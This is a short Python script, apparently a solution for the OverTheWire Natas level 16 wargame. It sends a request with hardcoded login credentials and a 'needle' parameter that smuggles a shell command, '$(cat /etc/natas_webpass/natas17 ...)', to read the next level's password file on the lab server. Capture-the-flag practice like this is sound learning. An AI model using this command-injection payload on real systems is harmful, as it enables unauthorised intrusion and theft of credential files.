import requests

url = 'http://natas16.natas.labs.overthewire.org'
user = 'natas16'
password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'

injection = '$(cat /etc/natas_webpass/natas17 >> dictionary.txt)'
data = {'needle': injection} 

response = requests.get(url, auth=(user, password), params=data)
print(response.text)

